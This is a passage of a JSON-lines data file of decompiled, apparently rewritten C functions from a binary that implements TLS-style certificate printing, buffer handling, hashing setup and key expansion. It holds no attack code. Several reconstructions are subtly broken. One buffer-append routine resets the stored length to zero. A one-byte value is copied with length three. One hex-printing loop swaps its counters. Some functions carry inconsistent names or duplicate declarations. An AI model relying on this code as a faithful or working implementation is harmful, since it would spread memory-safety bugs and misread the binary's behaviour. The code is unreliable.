bytes_written_current; \n                loop_index = 0; \n                do {\n                    if ((int)loop_index == 0) { \n                        bytes_written_current = snprintf(output_buffer + bytes_written,(long)(buffer_size - bytes_written),\"%s\", \n                                         **(undefined8 **)(asn1_data + 0x50));\n                    } else {\n                        bytes_written_current = snprintf(output_buffer + bytes_written,(long)(buffer_size - bytes_written),\", %s\", \n                                         *(undefined8 *)(*(long *)(asn1_data + 0x50) + loop_index * 8));\n                    }\n                    bytes_written += bytes_written_current; \n                    loop_index++; \n                } while (loop_index < asn1_data[0x54]); \n            }\n            bytes_written_current = snprintf(output_buffer + bytes_written,(long)(buffer_size - bytes_written),\"\\n  Key (%i bits, \", \n                             (ulong)(uint)(*(int *)(asn1_data + 0x14) * 8));\n            bytes_written += bytes_written_current; \n            if (0 < bytes_written) { \n                current_output_position = output_buffer + bytes_written; \n                remaining_buffer_size = (size_t)(buffer_size - bytes_written); \n                switch(*(undefined4 *)(asn1_data + 4)) { \n                    default:\n                        bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\"not supported (%i)\"); \n                        break;\n                    case 1: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\"RSA_SIGN_RSA\"); break; \n                    case 4: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\"RSA_SIGN_MD5\"); break; \n                    case 5: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\"RSA_SIGN_SHA1\"); break; \n                    case 0xb: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\"RSA_SIGN_SHA256\"); break; \n                    case 0xc: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\"RSA_SIGN_SHA384\"); break; \n                    case 0xd: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\"RSA_SIGN_SHA512\"); break; \n                    case 0xe: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\"ECDSA_SIGN_SHA512\"); break; \n                    case 0x11: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\"EC_PUBLIC_KEY\"); break; \n                }\n                bytes_written += bytes_written_current; \n                if ((0 < bytes_written) && (*(int *)(asn1_data + 6) != 0)) { \n                    current_output_position = output_buffer + bytes_written; \n                    remaining_buffer_size = (size_t)(buffer_size - bytes_written); \n                    switch(*(int *)(asn1_data + 6)) { \n                        case 0x12: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\" prime192v1\"); break; \n                        case 0x13: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\" prime192v2\"); break; \n                        case 0x14: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\" prime192v3\"); break; \n                        case 0x15: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\" EC_secp224r1\"); break; \n                        case 0x16: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\" prime239v2\"); break; \n                        case 0x17: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\" EC_secp256r1\"); break; \n                        case 0x18: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\" EC_secp384r1\"); break; \n                        case 0x19: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\" EC_secp521r1\"); break; \n                        default: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\" unknown(%i)\"); break; \n                    }\n                    bytes_written += bytes_written_current; \n                }\n            }\n            bytes_written_current = snprintf(output_buffer + bytes_written,(long)(buffer_size - bytes_written),\"):\\n\"); \n            bytes_written += bytes_written_current; \n            if (0 < bytes_written) { \n                if (*(int *)(asn1_data + 0x14) != 0) { \n                    loop_index = 0; \n                    do {\n                        loop_index_increment = (int)loop_index + 1; \n                        bytes_written_current = snprintf(output_buffer + bytes_written,(long)(buffer_size - bytes_written),\"%02x\", \n                                         (ulong)*(byte *)(*(long *)(asn1_data + 0x10) + loop_index));\n                        bytes_written += bytes_written_current; \n                        loop_index = (ulong)loop_index_increment; \n                    } while (loop_index_increment < *(uint *)(asn1_data + 0x14)); \n                }\n                bytes_written_current = snprintf(output_buffer + bytes_written,(long)(buffer_size - bytes_written),\"\\n  Signature (%i bits, \", \n                                 (ulong)(uint)(*(int *)(asn1_data + 0x68) * 8));\n                bytes_written += bytes_written_current; \n                current_output_position = output_buffer + bytes_written; \n                remaining_buffer_size = (size_t)(buffer_size - bytes_written); \n                switch(*(undefined4 *)(asn1_data + 2)) { \n                    default: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\"not supported):\\n\"); break; \n                    case 1: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\"RSA_SIGN_RSA):\\n\"); break; \n                    case 4: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\"RSA_SIGN_MD5):\\n\"); break; \n                    case 5: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\"RSA_SIGN_SHA1):\\n\"); break; \n                    case 0xb: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\"RSA_SIGN_SHA256):\\n\"); break; \n                    case 0xc: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\"RSA_SIGN_SHA384):\\n\"); break; \n                    case 0xd: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\"RSA_SIGN_SHA512):\\n\"); break; \n                    case 0x11: bytes_written_current = snprintf(current_output_position,remaining_buffer_size,\"EC_PUBLIC_KEY):\\n\"); break; \n                }\n                loop_index_increment = 0; \n                if (*(int *)(asn1_data + 0x68) != 0) { \n                    do {\n                        loop_index = (ulong)loop_index_increment; \n                        loop_index_increment++; \n                        bytes_written = snprintf(output_buffer + bytes_written_current,(long)(buffer_size - bytes_written_current),\"%02x\", \n                                         (ulong)*(byte *)(*(long *)(asn1_data + 100) + loop_index));\n                        bytes_written_current += bytes_written; \n                    } while (loop_index_increment < *(uint *)(asn1_data + 0x68)); \n                }\n            }\n        }\n    }\n    return output_buffer; \n}"}
{"Function Name": "FUN_00427a50", "Address": "00427a50", "Source Code": "void FUN_00427a50(long base_address, undefined8 data_value, undefined4 value_to_store)\n{\n    \n    FUN_00427230(base_address + 0x10);\n    \n    \n    if (*(long *)(base_address + 0x10) != 0) {\n        \n        *(undefined4 *)(base_address + 0x18) = value_to_store;\n    }\n}"}
{"Function Name": "FUN_00427a80", "Address": "00427a80", "Source Code": "void FUN_00427a80(long base_address, undefined8 data_pointer, undefined4 value_to_store)\n{\n    \n    FUN_00427230(base_address + 0xb8);\n    \n    \n    if (*(long *)(base_address + 0xb8) != 0) {\n        \n        *(undefined4 *)(base_address + 0xc0) = value_to_store;\n    }\n}"}
{"Function Name": "FUN_00427ab0", "Address": "00427ab0", "Source Code": "void FUN_00427ab0(long input_param, undefined4 *output_param, char *char_array, int condition_code) {\n    char *char_pointer; \n    long index_next;   \n    long index_current;   \n    \n    if (condition_code == 7) {\n        \n        if (*char_array == '\\0') {\n            *output_param = 0x11; \n            return; \n        }\n        \n        if (*char_array == '*') {\n            index_current = 0; \n            do {\n                index_next = index_current + 1; \n                \n                if ((char_array[index_next] == '\\0') || (index_current == 6)) {\n                    *output_param = 0x11; \n                    return; \n                }\n                char_pointer = &DAT_00438b23 + index_current; \n                index_current++; \n            } while (*char_pointer == char_array[index_next]); \n        }\n    } \n    \n    else if (condition_code == 8) {\n        \n        if (*char_array == '\\0') {\n            *output_param = 0x12; \n            return; \n        }\n        \n        if (*char_array == '*') {\n            index_current = 0; \n            do {\n                index_next = index_current + 1; \n                \n                if ((char_array[index_next] == '\\0') || (index_current == 7)) {\n                    *output_param = 0x12; \n                    return; \n                }\n                char_pointer = &DAT_00438b1a + index_current; \n                index_current++; \n            } while (*char_pointer == char_array[index_next]); \n            \n            \n            for (int iteration_index = 0; iteration_index < 5; iteration_index++) {\n                index_current = 0; \n                do {\n                    index_next = index_current + 1; \n                    \n                    if ((char_array[index_next] == '\\0') || (index_current == 7)) {\n                        *output_param = 0x13 + iteration_index; \n                        return; \n                    }\n                    char_pointer = &DAT_00438b08 + (iteration_index * 0x10) + index_current; \n                    index_current++; \n                } while (*char_pointer == char_array[index_next]); \n            }\n        }\n    } \n    \n    else if (condition_code == 5) {\n        \n        for (int iteration_index = 0; iteration_index < 3; iteration_index++) {\n            index_current = 0; \n            \n            while (char_array[index_current] == (&DAT_00438add - iteration_index * 0x8)[index_current]) {\n                index_current++; \n                \n                if (index_current == 5) {\n                    *output_param = 0x15 + iteration_index; \n                    return; \n                }\n            }\n        }\n    } \n    \n    else if (condition_code == 9) {\n        \n        if (*char_array == '\\0') {\n            *output_param = 0xb; \n            return; \n        }\n        \n        if (*char_array == '*') {\n            index_current = 0; \n            do {\n                index_next = index_current + 1; \n                \n                if ((char_array[index_next] == '\\0') || (index_current == 8)) {\n                    *output_param = 0xb; \n                    return; \n                }\n                char_pointer = &DAT_00438b4a + index_current; \n                index_current++; \n            } while (*char_pointer == char_array[index_next]); \n            \n            \n            for (int iteration_index = 0; iteration_index < 7; iteration_index++) {\n                index_current = 0; \n                do {\n                    index_next = index_current + 1; \n                    \n                    if ((char_array[index_next] == '\\0') || (index_current == 8)) {\n                        *output_param = 1 + (iteration_index * 2); \n                        return; \n                    }\n                    char_pointer = &DAT_00438b36 + (iteration_index * 0x10) + index_current; \n                    index_current++; \n                } while (*char_pointer == char_array[index_next]); \n            }\n        }\n    }\n    \n    if (*(char *)(input_param + 0x66) == '\\0') {\n        *(undefined *)(input_param + 0x22389) = 1; \n    }\n}"}
{"Function Name": "FUN_00427e80", "Address": "00427e80", "Source Code": "void FUN_00427e80(void *input_param)\n{\n    \n    if (input_param != (void *)0x0) {\n        \n        for (int index = 0; index < 10; index++) {\n            \n            void **element_ptr = *(void ***)((long)input_param + 0x10 + index * 0x10);\n            \n            if (element_ptr != (void *)0x0) {\n                free(element_ptr);\n            }\n        }\n        long offset = 0; \n        \n        void *main_ptr = *(void **)((long)input_param + 0xa0);\n        \n        if (*(short *)((long)input_param + 0xa8) != 0) {\n            \n            for (int index = 0; index < (int)(uint)*(ushort *)((long)input_param + 0xa8); index++) {\n                \n                void **element_ptr = *(void **)((long)main_ptr + offset);\n                \n                if (element_ptr != (void *)0x0) {\n                    free(element_ptr);\n                }\n                offset += 8; \n            }\n        }\n        \n        if (main_ptr != (void *)0x0) {\n            free(main_ptr);\n        }\n        \n        for (int index = 0; index < 6; index++) {\n            \n            void **element_ptr = *(void ***)((long)input_param + 0xb0 + index * 0x10);\n            \n            if (element_ptr != (void *)0x0) {\n                free(element_ptr);\n            }\n        }\n        \n        free(input_param);\n    }\n}"}
{"Function Name": "FUN_00428040", "Address": "00428040", "Source Code": "void ** FUN_00428040(void *inputParam, undefined inputFlag, ushort inputValue, int sizeParam)\n{\n    \n    void **pointerArray = (void **)malloc(0x20);\n    \n    \n    if (pointerArray == (void **)0x0) {\n        return (void **)0x0; \n    }\n    \n    size_t allocationSize = (sizeParam < 1) ? 0xfff : (size_t)(sizeParam + 10);\n    \n    \n    *(undefined *)(pointerArray + 2) = 0;\n    \n    \n    *(int *)((long)pointerArray + 0xc) = (sizeParam < 1) ? 0xfff : sizeParam + 10;\n    \n    undefined *buffer = (undefined *)malloc(allocationSize);\n    \n    \n    if (buffer == (undefined *)0x0) {\n        free(pointerArray); \n        return (void **)0x0; \n    }\n    \n    pointerArray[3] = inputParam;\n    \n    \n    *pointerArray = buffer;\n    \n    \n    *(undefined4 *)(pointerArray + 1) = (inputParam == (void *)0x0 || *(char *)((long)inputParam + 0x223c9) == '\\0') ? 5 : 0xd;\n    \n    \n    *buffer = inputFlag;\n    \n    \n    *(ushort *)(buffer + 1) = inputValue >> 8 | inputValue << 8;\n    \n    return pointerArray;\n}"}
{"Function Name": "FUN_00428100", "Address": "00428100", "Source Code": "void FUN_00428100(void **pointer_to_memory)\n{\n    \n    if (pointer_to_memory && *pointer_to_memory) {\n        \n        free(*pointer_to_memory);\n    }\n    \n    free(pointer_to_memory);\n}"}
{"Function Name": "FUN_00428130", "Address": "00428130", "Source Code": "undefined8 FUN_00428130(long input_address, undefined8 data, void *buffer, uint size)\n{\n    \n    if (*(char *)(input_address + 0x22358) == '\\x01') {\n        \n        return FUN_00422ff0(data, buffer, (ulong)size, input_address + 0xd8);\n    }\n    \n    memset(buffer, 0, (ulong)size);\n    \n    return 0xffffffff;\n}"}
{"Function Name": "FUN_00428170", "Address": "00428170", "Source Code": "undefined8 FUN_00428170(long input_address, undefined8 data, void *buffer, uint size)\n{\n    \n    if (*(char *)(input_address + 0x22358) == '\\x01') {\n        \n        return FUN_00422da0(data, buffer, (ulong)size, input_address + 0x111e8);\n    }\n    \n    memset(buffer, 0, (ulong)size);\n    \n    return 0xffffffff;\n}"}
{"Function Name": "FUN_004281b0", "Address": "004281b0", "Source Code": "void FUN_004281b0(long input_param)\n{\n    \n    if (*(char *)(input_param + 0x22358) != '\\x01') {\n        \n        if (*(char *)(input_param + 0x22358) == '\\x02') {\n            \n            FUN_004236b0(input_param + 0x111e8, NULL, NULL);\n            \n            FUN_004236b0(input_param + 0xd8, NULL, NULL);\n        }\n        \n        *(undefined *)(input_param + 0x22358) = 0;\n        \n        return;\n    }\n    \n    FUN_00422f90(input_param + 0x111e8);\n    \n    FUN_00422f90(input_param + 0xd8);\n    \n    *(undefined *)(input_param + 0x22358) = 0;\n    \n    return;\n}"}
{"Function Name": "FUN_00428240", "Address": "00428240", "Source Code": "uint FUN_00428240(void **data_pointer, void *source_pointer, uint data_size)\n{\n    uint return_value; \n    void *reallocated_pointer; \n    \n    if ((data_pointer == (void **)0x0) || (*(char *)(data_pointer + 2) != '\\0')) {\n        return_value = 0xffffffff; \n    } else {\n        return_value = 0; \n        \n        if (data_size != 0) {\n            uint new_size = *(uint *)(data_pointer + 1) + data_size; \n            \n            if (*(uint *)((long)data_pointer + 0xc) < new_size) {\n                \n                new_size = (new_size / 0xfff + 1) * 0xfff;\n                *(uint *)((long)data_pointer + 0xc) = new_size; \n                reallocated_pointer = realloc(*data_pointer, (ulong)new_size); \n                *data_pointer = reallocated_pointer; \n                \n                if (reallocated_pointer == (void *)0x0) {\n                    *(undefined4 *)((long)data_pointer + 0xc) = 0; \n                    *(undefined4 *)(data_pointer + 1) = 0; \n                    *(undefined *)(data_pointer + 2) = 1; \n                    return 0xffffffff; \n                }\n            }\n            new_size = *(uint *)(data_pointer + 1); \n        } else {\n            reallocated_pointer = *data_pointer; \n        }\n        \n        memcpy((void *)((long)reallocated_pointer + (ulong)new_size), source_pointer, (ulong)data_size);\n        *(uint *)(data_pointer + 1) = return_value; \n    }\n    return return_value; \n}"}
{"Function Name": "FUN_00428310", "Address": "00428310", "Source Code": "void FUN_00428310(undefined8 input_value, undefined input_flag)\n{\n    \n    undefined local_array[12] = {input_flag};\n    \n    \n    FUN_00428240(input_value, local_array, 1);\n}"}
{"Function Name": "FUN_00428330", "Address": "00428330", "Source Code": "void FUN_00428330(undefined8 input_param, ushort input_value)\n{\n    ushort byte_array[5]; \n    byte_array[0] = input_value >> 8 | input_value << 8; \n    FUN_00428240(input_param, byte_array, 2); \n}"}
{"Function Name": "FUN_00428360", "Address": "00428360", "Source Code": "void FUN_00428360(undefined8 input_param, uint byte_data)\n{\n    \n    uint rearranged_bytes = byte_data >> 0x18 |                \n                   (byte_data & 0xff0000) >> 8 |      \n                   (byte_data & 0xff00) << 8 |        \n                   byte_data << 0x18;                 \n    \n    FUN_00428240(input_param, &rearranged_bytes, 4);\n    \n    return; \n}"}
{"Function Name": "FUN_00428380", "Address": "00428380", "Source Code": "void FUN_00428380(undefined8 input_param, undefined4 input_value)\n{\n    \n    undefined upper_bits = (undefined)((uint)input_value >> 0x10);\n    \n    \n    FUN_00428240(input_param, &upper_bits, 3);\n    \n    \n    return;\n}"}
{"Function Name": "FUN_00428400", "Address": "00428400", "Source Code": "void initializeFunction(void) \n{\n    processData(&dataPointer, 0x20); \n}"}
{"Function Name": "FUN_00428410", "Address": "00428410", "Source Code": "void FUN_00428410(void)\n{\n    \n    global_variable = 1;\n    \n    undefined **data_pointer = &PTR_s_LibTomMath_0043dba0;\n    undefined8 *destination_pointer = &DAT_00669900;\n    \n    for (long loop_counter = 0x31; loop_counter != 0; loop_counter--) {\n        \n        *destination_pointer++ = *data_pointer++;\n    }\n    \n    FUN_00414660(&PTR_s_sprng_0043db40); \n    FUN_004145a0(&PTR_s_sha256_0043d980); \n    FUN_004145a0(&PTR_DAT_0043da60); \n    FUN_004145a0(&PTR_s_sha384_0043d8a0); \n    FUN_004145a0(&PTR_s_sha512_0043d7c0); \n    FUN_004145a0(&PTR_DAT_00438ca0); \n    FUN_004144e0(&PTR_DAT_00438f80); \n    FUN_00425980(); \n    FUN_004283b0(&DAT_006698e0, 0x20); \n}"}
{"Function Name": "FUN_00428490", "Address": "00428490", "Source Code": "void mainFunction(void) \n{\n    if (isNullFlag == '\\0') { \n        callAnotherFunction(); \n    }\n}"}
{"Function Name": "FUN_004284b0", "Address": "004284b0", "Source Code": "void * FUN_004284b0(long input_param_1, undefined8 input_param_2, int input_param_3, undefined4 *output_param)\n{\n    long dereferenced_long; \n    int integer_value; \n    undefined4 sha256_identifier; \n    undefined4 sprng_identifier; \n    void *allocated_memory_ptr; \n    long another_long_value; \n    *output_param = 0; \n    \n    if (input_param_3 != 0 && input_param_1 != 0 && *(long **)(input_param_1 + 0x68) != (long *)0x0 &&\n        *(int *)(input_param_1 + 0xb0) != 0 && (dereferenced_long = **(long **)(input_param_1 + 0x68), dereferenced_long != 0) &&\n        (another_long_value = *(long *)(dereferenced_long + 0xe0), another_long_value != 0 && (integer_value = *(int *)(dereferenced_long + 0xe8), integer_value != 0))) \n    {\n        \n        if (DAT_006698df == '\\0') {\n            FUN_00428410(); \n            integer_value = *(int *)(**(long **)(input_param_1 + 0x68) + 0xe8); \n            another_long_value = *(long *)(**(long **)(input_param_1 + 0x68) + 0xe0); \n        }\n        \n        if (FUN_004204c0(another_long_value, integer_value, local_buffer) == 0) {\n            long buffer_size = 0x800; \n            allocated_memory_ptr = malloc(0x800); \n            sha256_identifier = FUN_00414210(\"sha256\"); \n            sprng_identifier = FUN_00414410(\"sprng\"); \n            \n            integer_value = FUN_004201b0(input_param_2, input_param_3, allocated_memory_ptr, &buffer_size, \"Concept\", 7, 0, sprng_identifier, sha256_identifier, 1, local_buffer);\n            FUN_00420450(local_buffer); \n            \n            if (integer_value == 0 && buffer_size != 0) {\n                *output_param = (int)buffer_size; \n                return allocated_memory_ptr; \n            }\n            \n            if (allocated_memory_ptr != (void *)0x0) {\n                free(allocated_memory_ptr); \n            }\n        }\n    }\n    return (void *)0x0; \n}"}
{"Function Name": "FUN_00428f60", "Address": "00428f60", "Source Code": "ulong FUN_00428f60(long input_param_1, uint input_param_2, undefined8 input_param_3, undefined4 input_param_4, long input_param_5, long input_param_6)\n{\n    long long_value_1; \n    uint *uint_array_pointer; \n    uint unsigned_value_3; \n    int integer_return_value; \n    uint minimum_unsigned_value; \n    undefined4 undefined_value_4; \n    long long_value_8; \n    long long_value_9; \n    undefined local_buffer_1b8 [48]; \n    undefined local_buffer_188 [16]; \n    undefined local_buffer_148 [280]; \n    \n    if (input_param_6 == 0 || input_param_1 == 0 || input_param_5 == 0) {\n        return 0xffffffff;\n    }\n    \n    long_value_1 = *(long *)(input_param_1 + 0x78);\n    \n    if (long_value_1 == 0) {\n        return 0xffffffff;\n    }\n    \n    long_value_9 = *(long *)(long_value_1 + 0x30);\n    \n    if (long_value_9 == 0) {\n        return 0xffffffff;\n    }\n    \n    int integer_value_7 = *(int *)(long_value_1 + 0x28);\n    \n    if (integer_value_7 == 0) {\n        return 0xffffffff;\n    }\n    \n    long_value_8 = *(long *)(long_value_1 + 0x20);\n    \n    if (long_value_8 == 0) {\n        return 0xffffffff;\n    }\n    \n    int integer_return_value = *(int *)(long_value_1 + 0x38);\n    \n    if (integer_return_value == 0) {\n        return 0xffffffff;\n    }\n    \n    uint unsigned_value_3 = *(int *)(long_value_1 + 0xc) - 0x13;\n    \n    if (6 < unsigned_value_3) {\n        return 0xffffffff;\n    }\n    \n    uint_array_pointer = (uint *)(&PTR_DAT_00438640)[unsigned_value_3];\n    \n    if (uint_array_pointer == (uint *)0x0) {\n        return 0xffffffff;\n    }\n    \n    if (DAT_006698df == '\\0') {\n        FUN_00428410();\n    }\n    \n    integer_return_value = FUN_004261a0(long_value_9, integer_return_value, long_value_8, integer_value_7, local_buffer_1b8, uint_array_pointer + 0x10);\n    \n    if (integer_return_value != 0) {\n        return 0xffffffff;\n    }\n    \n    if (input_param_2 == 4) {\n        \n        integer_return_value = FUN_00412790(local_buffer_148);\n        \n        if (integer_return_value != 0) {\n            return 0xffffffff;\n        }\n        \n        integer_return_value = FUN_00412800(local_buffer_148, input_param_3, input_param_4);\n        \n        if (integer_return_value != 0) {\n            return 0xffffffff;\n        }\n        \n        integer_return_value = FUN_00412930(local_buffer_148, local_buffer_188);\n        unsigned_value_3 = 0x20; \n    } else if (input_param_2 < 5) {\n        \n        if (input_param_2 == 1) {\n            integer_return_value = FUN_00413d60(local_buffer_148);\n            if (integer_return_value != 0) {\n                return 0xffffffff;\n            }\n            integer_return_value = FUN_00413dc0(local_buffer_148, input_param_3, input_param_4);\n            if (integer_return_value != 0) {\n                return 0xffffffff;\n            }\n            integer_return_value = FUN_00413ef0(local_buffer_148, local_buffer_188);\n            unsigned_value_3 = 0x10; \n        \n        } else if (input_param_2 == 2) {\n            integer_return_value = FUN_00412450(local_buffer_148);\n            if (integer_return_value != 0) {\n                return 0xffffffff;\n            }\n            integer_return_value = FUN_004124b0(local_buffer_148, input_param_3, input_param_4);\n            if (integer_return_value != 0) {\n                return 0xffffffff;\n            }\n            integer_return_value = FUN_004125e0(local_buffer_148, local_buffer_188);\n            unsigned_value_3 = 0x14; \n        } else {\n            unsigned_value_3 = 0; \n        }\n    } else if (input_param_2 == 6) {\n        \n        integer_return_value = FUN_00412b90(local_buffer_148);\n        if (integer_return_value != 0) {\n            return 0xffffffff;\n        }\n        integer_return_value = FUN_00412c40(local_buffer_148, input_param_3, input_param_4);\n        if (integer_return_value != 0) {\n            return 0xffffffff;\n        }\n        integer_return_value = FUN_00412d70(local_buffer_148, local_buffer_188);\n        unsigned_value_3 = 0x40; \n    } else if (input_param_2 == 0xff) {\n        \n        integer_return_value = FUN_00413d60(local_buffer_148);\n        if (integer_return_value != 0) {\n            return 0xffffffff;\n        }\n        integer_return_value = FUN_00413dc0(local_buffer_148, input_param_3, input_param_4);\n        if (integer_return_value != 0) {\n            return 0xffffffff;\n        }\n        integer_return_value = FUN_00413ef0(local_buffer_148, local_buffer_188);\n        if (integer_return_value != 0) {\n            return 0xffffffff;\n        }\n        integer_return_value = FUN_00412450(local_buffer_148);\n        if (integer_return_value != 0) {\n            return 0xffffffff;\n        }\n        integer_return_value = FUN_004124b0(local_buffer_148, input_param_3, input_param_4);\n        if (integer_return_value != 0) {\n            return 0xffffffff;\n        }\n        integer_return_value = FUN_004125e0(local_buffer_148, local_buffer_188);\n        if (integer_return_value != 0) {\n            return 0xffffffff;\n        }\n        unsigned_value_3 = 0x24; \n    } else {\n        \n        integer_return_value = FUN_00412ae0(local_buffer_148);\n        if (integer_return_value != 0) {\n            return 0xffffffff;\n        }\n        integer_return_value = FUN_00412c40(local_buffer_148, input_param_3, input_param_4);\n        if (integer_return_value != 0) {\n            return 0xffffffff;\n        }\n        integer_return_value = FUN_00412f30(local_buffer_148, local_buffer_188);\n        unsigned_value_3 = 0x30; \n    }\n    \n    if (integer_return_value != 0) {\n        return 0xffffffff;\n    }\n    \n    minimum_unsigned_value = *uint_array_pointer;\n    \n    if (unsigned_value_3 <= *uint_array_pointer) {\n        minimum_unsigned_value = unsigned_value_3;\n    }\n    \n    undefined_value_4 = FUN_00414410(\"sprng\");\n    \n    integer_return_value = FUN_0041cab0(local_buffer_188, minimum_unsigned_value, input_param_5, input_param_6, 0, undefined_value_4, local_buffer_1b8);\n    \n    FUN_0041b230(local_buffer_1b8);\n    \n    return (ulong)(integer_return_value == 0);\n}"}
{"Function Name": "FUN_00429a60", "Address": "00429a60", "Source Code": "undefined8 FUN_00429a60(long inputParameter)\n{\n    int result1; \n    int result2; \n    int valueAtOffsetC0; \n    undefined8 *dataPointer; \n    long valueAtOffsetB8; \n    undefined8 *localPointer; \n    long conditionalAddress1; \n    long conditionalAddress2; \n    size_t sizeCalculation; \n    undefined8 intermediateData; \n    undefined4 temporaryStorage[48]; \n    valueAtOffsetB8 = *(long *)(inputParameter + 0xb8); \n    if (valueAtOffsetB8 == 0) { \n        return 0; \n    }\n    valueAtOffsetC0 = *(int *)(inputParameter + 0xc0); \n    if (valueAtOffsetC0 == 0) { \n        return 0; \n    }\n    result1 = function1(); \n    result2 = function2(inputParameter); \n    if (result2 == 0 || result1 == 0) { \n        return 0; \n    }\n    localPointer = &intermediateData; \n    if (*(char *)(inputParameter + 0x66) == '\\0') { \n        conditionalAddress1 = inputParameter; \n        conditionalAddress2 = inputParameter + 0x20; \n    } else {\n        conditionalAddress1 = inputParameter + 0x20; \n        conditionalAddress2 = inputParameter; \n    }\n    \n    keyExpansionFunction(inputParameter, localPointer, 0xc0, valueAtOffsetB8, valueAtOffsetC0, \"key expansion\", 0xd, conditionalAddress1, 0x20, conditionalAddress2, 0x20);\n    \n    if (functionCheck(inputParameter) == 2) { \n        dataPointer = (undefined8 *)((long)localPointer + (long)(result1 * 2 + 0xc)); \n        if (*(char *)(inputParameter + 0x66) == '\\0') { \n            *(undefined8 *)(inputParameter + 0x222f8) = *(localPointer + (result1 * 2)); \n            *(undefined4 *)(inputParameter + 0x22300) = *(undefined4 *)((long)temporaryStorage + (result1 * 2)); \n            *(undefined8 *)(inputParameter + 0x22328) = *dataPointer; \n            *(undefined4 *)(inputParameter + 0x22330) = *(undefined4 *)((long)temporaryStorage + (result1 * 2 + 0xc)); \n        } else {\n            *(undefined8 *)(inputParameter + 0x22328) = *(localPointer + (result1 * 2)); \n            *(undefined4 *)(inputParameter + 0x22330) = *(undefined4 *)((long)temporaryStorage + (result1 * 2)); \n            *(undefined8 *)(inputParameter + 0x222f8) = *dataPointer; \n            *(undefined4 *)(inputParameter + 0x22300) = *(undefined4 *)((long)temporaryStorage + (result1 * 2 + 0xc)); \n        }\n    } else if (functionCheck(inputParameter) == 0) { \n        sizeCalculation = (size_t)result2; \n        if (*(char *)(inputParameter + 0x66) == '\\0') { \n            memcpy((void *)(inputParameter + 0x222f8), localPointer, sizeCalculation); \n            memcpy((void *)(inputParameter + 0x22328), (void *)((long)localPointer + sizeCalculation), sizeCalculation); \n        } else {\n            memcpy((void *)(inputParameter + 0x22328), localPointer, sizeCalculation); \n            memcpy((void *)(inputParameter + 0x222f8), (void *)((long)localPointer + sizeCalculation), sizeCalculation); \n        }\n        dataPointer = (undefined8 *)((long)localPointer + (long)(result2 * 2 + result1)); \n    } else {\n        dataPointer = (undefined8 *)((long)localPointer + (long)(result1 * 2 + 4)); \n        if (*(char *)(inputParameter + 0x66) == '\\0') { \n            *(undefined4 *)(inputParameter + 0x222f8) = *(undefined4 *)((long)localPointer + (long)(result1 * 2)); \n            *(undefined4 *)(inputParameter + 0x22328) = *(undefined4 *)dataPointer; \n        } else {\n            *(undefined4 *)(inputParameter + 0x22328) = *(undefined4 *)((long)localPointer + (long)(result1 * 2)); \n            *(undefined4 *)(inputParameter + 0x222f8) = *(undefined4 *)dataPointer; \n        }\n    }\n    if (functionValidation(inputParameter, result1, localPointer, dataPointer) != 0) { \n        return 0; \n    }\n    if (*(char *)(inputParameter + 0x223ad) != '\\0') { \n        if (*(void **)(inputParameter + 0x223b0) != (void *)0x0) { \n            free(*(void **)(inputParameter + 0x223b0)); \n        }\n        void *destinationPointer = malloc((long)(result1 * 2)); \n        *(void **)(inputParameter + 0x223b0) = destinationPointer; \n        if (destinationPointer != (void *)0x0) { \n            sizeCalculation = (size_t)result1; \n            if (*(char *)(inputParameter + 0x66) == '\\0') { \n                memcpy(destinationPointer, (void *)((long)localPointer + (long)(result1 * 2)), sizeCalculation); \n                memcpy((void *)(sizeCalculation + *(long *)(inputParameter + 0x223b0)), localPointer, sizeCalculation); \n            } else {\n                memcpy(destinationPointer, localPointer, sizeCalculation); \n                memcpy((void *)(sizeCalculation + *(long *)(inputParameter + 0x223b0)), (void *)((long)localPointer + (long)(result1 * 2)), sizeCalculation); \n            }\n            *(char *)(inputParameter + 0x223b8) = (char)result1 * '\\x02'; \n        }\n    }\n    return 1; \n}"}
{"Function Name": "FUN_00429d90", "Address": "00429d90", "Source Code": "undefined8 FUN_00429d90(long param_1, uint param_2)\n{\n    short shortValue; \n    int integerValue; \n    void *allocatedMemoryPointer; \n    void *anotherMemoryPointer; \n    long tempAddress1; \n    long tempAddress2; \n    \n    if (((*(long *)(param_1 + 200) == 0) || (*(int *)(param_1 + 0xd0) == 0)) || (param_2 < 0x30)) {\n        return 0; \n    }\n    \n    if (*(void **)(param_1 + 0xb8) != (void *)0x0) {\n        free(*(void **)(param_1 + 0xb8));\n    }\n    shortValue = *(short *)(param_1 + 100); \n    *(undefined4 *)(param_1 + 0xc0) = 0; \n    *(undefined8 *)(param_1 + 0xb8) = 0; \n    \n    if (((3 < (ushort)(shortValue - 0x301U)) && (1 < (ushort)(shortValue + 0x104U))) && (shortValue != -0x101)) {\n        return 0; \n    }\n    \n    allocatedMemoryPointer = malloc((ulong)param_2);\n    *(void **)(param_1 + 0xb8) = allocatedMemoryPointer; \n    if (allocatedMemoryPointer == (void *)0x0) {\n        return 0; \n    }\n    *(uint *)(param_1 + 0xc0) = param_2; \n    integerValue = *(int *)(param_1 + 0xd0); \n    anotherMemoryPointer = *(void **)(param_1 + 200); \n    \n    if (*(char *)(param_1 + 0x66) == '\\0') {\n        \n        if ((integerValue == 0) || (anotherMemoryPointer == (void *)0x0)) goto LAB_00429e66; \n        tempAddress1 = param_1 + 0x20; \n        tempAddress2 = 